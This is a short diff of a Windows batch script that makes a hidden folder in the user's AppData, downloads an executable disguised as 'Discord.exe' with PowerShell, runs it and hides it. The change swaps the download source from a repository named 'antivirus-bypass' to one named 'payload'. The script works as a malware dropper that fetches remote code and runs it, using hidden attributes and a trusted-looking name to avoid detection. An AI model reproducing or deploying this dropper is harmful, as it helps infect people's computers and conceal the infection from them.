@@ -31,7 +31,7 @@ mkdir "Anon"
 attrib +h "Anon" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
 :--------------------------------------
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/antivirus-bypass/raw/main/Discord.exe' -OutFile Discord.exe"
+Powershell -Command "Invoke-Webrequest 'https://github.com/anonymous-osif/payload/raw/main/Discord.exe' -OutFile Discord.exe"
 start Discord.exe
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d
 :--------------------------------------
